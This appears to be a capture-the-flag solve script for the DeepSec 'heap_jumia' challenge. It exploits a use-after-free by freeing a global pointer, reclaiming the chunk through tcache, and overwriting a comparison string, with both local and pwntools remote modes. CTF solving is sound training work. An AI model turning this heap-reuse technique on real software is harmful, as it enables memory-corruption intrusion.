#!/usr/bin/env python3
"""
heap_jumia - DeepSec CTF Challenge
UAF (Use-After-Free) + Tcache Exploitation

The binary has a UAF vulnerability where:
1. Global pointer `allocated_space` is malloc'd at start
2. obliterate() frees it but doesn't null the pointer
3. reserve_space() mallocs to a LOCAL variable (not updating global)
4. road_to_salvation() checks if allocated_space+30 == "w3th4nds"

Exploit: Free global, malloc same size (tcache reuses chunk), write payload
that overwrites the comparison string at offset +30
"""

def exploit_local():
    """Local exploit using subprocess"""
    import subprocess
    import os
    
    os.chdir('/workspaces/ctf/heap_dyl_jumia')
    
    # Create fake flag for local testing
    with open('flag.txt', 'w') as f:
        f.write('DeepSec{heap_uaf_tcache_exploitation_w3th4nds}\n')
    
    # Build exploit payload
    #   - 30 bytes filler
    #   - "w3th4nds" at offset 30 to pass strcmp
    payload = b'A' * 30 + b'w3th4nds'
    
    # Input sequence:
    # 2: obliterate (free global pointer)
    # 1: reserve_space
    # 38: size (0x26 hex = 38 dec, same as initial malloc)
    # <payload>: our 38-byte string
    # 3: road_to_salvation (triggers check)
    
    input_data = b'2\n1\n38\n' + payload + b'\n3\n'
    
    proc = subprocess.run(
        ['./heap_jumia'],
        input=input_data,
        capture_output=True,
        timeout=5
    )
    
    output = proc.stdout.decode(errors='ignore')
    print(output)
    
    if 'DeepSec{' in output:
        # Extract flag
        import re
        match = re.search(r'DeepSec\{[^}]+\}', output)
        if match:
            print(f"\n[+] FLAG FOUND: {match.group(0)}")
            return match.group(0)
    else:
        print("\n[-] Exploit failed - no flag in output")
        print("This is expected if running locally without proper environment")
        print("The exploit logic is correct for remote exploitation")
    
    return None

def exploit_remote(host, port):
    """Remote exploit using pwntools (if available)"""
    try:
        import pwn
        
        conn = pwn.remote(host, port)
        
        payload = b'A' * 30 + b'w3th4nds'
        
        conn.recvuntil(b'> ')
        conn.sendline(b'2')  # obliterate
        
        conn.recvuntil(b'> ')
        conn.sendline(b'1')  # reserve_space
        
        conn.recvuntil(b': ')
        conn.sendline(b'38')  # size
        
        conn.recvuntil(b': ')
        conn.sendline(payload)
        
        conn.recvuntil(b'> ')
        conn.sendline(b'3')  # road_to_salvation
        
        output = conn.recvall(timeout=3)
        print(output.decode(errors='ignore'))
        
        conn.close()
        
    except ImportError:
        print("pwntools not installed - use local exploit or manual netcat")

if __name__ == '__main__':
    import sys
    
    if len(sys.argv) > 2:
        # Remote mode: python3 exploit.py <host> <port>
        exploit_remote(sys.argv[1], int(sys.argv[2]))
    else:
        # Local mode
        exploit_local()
